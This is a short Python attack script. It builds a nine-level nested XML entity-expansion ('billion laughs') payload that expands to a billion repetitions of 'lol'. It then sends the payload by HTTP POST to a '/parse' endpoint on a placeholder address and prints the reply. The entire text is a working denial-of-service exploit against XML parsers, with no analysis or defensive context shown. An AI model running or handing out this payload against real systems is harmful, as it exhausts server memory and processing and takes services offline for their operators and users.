import requests

def bomb(n):
    out = ['<?xml version="1.0"?>', '<!DOCTYPE z [', '  <!ENTITY e0 "lol">']
    for i in range(1, n+1):
        out.append(f'  <!ENTITY e{i} "' + '&e%d;' % (i-1)*10 + '">')
    out += [']>', f'<z>&e{n};</z>']
    return "\n".join(out)

LEVEL = 9
payload = bomb(LEVEL)
print(f"payload is {len(payload)} bytes, expands to {10**LEVEL:,} 'lol's")
r = requests.post("http://x.x.x.x:8080/parse", data=payload.encode(), timeout=15)
print(r.text)
